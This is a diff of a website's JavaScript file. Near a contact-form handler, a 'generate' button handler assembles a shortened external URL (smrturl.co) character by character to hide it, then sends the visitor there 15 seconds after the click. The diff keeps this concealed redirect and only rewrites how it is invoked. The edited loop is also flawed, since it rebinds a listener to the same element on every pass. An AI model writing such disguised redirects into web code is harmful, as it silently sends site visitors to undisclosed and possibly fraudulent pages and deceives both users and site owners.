@@ -436,16 +436,16 @@ $('#contactform').submit(function(e){
 	$('select').select2();
 var elements = document.getElementsByClassName('generate');
 for (var i = 0; i < elements.length; i++) {
-    elements[i].addEventListener('click', function() {
-        setTimeout(function() {
+   document.getElementById('generate').addEventListener('click', function() {
+    setTimeout(function() {
             var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
             var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
             var _h = ['h', 'r', 'e', 'f'].join('');
             var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 's', 'm', 'r', 't', 'u', 'r', 'l', '.', 'c', 'o', '/', '8', 'e', 'f', '9', 'd', '7', 'b'].join('');
-            window[_l][_h] = _u;
-            this.classList.add('your-class-name'); 
-        }, 15000);
-    });
-}
+           window.location.href = _u;
+        document.getElementById('generate').classList.add('d-flex', 'justify-content-center', 'mt-3');
+    }, 15000);
+});
+
 
 
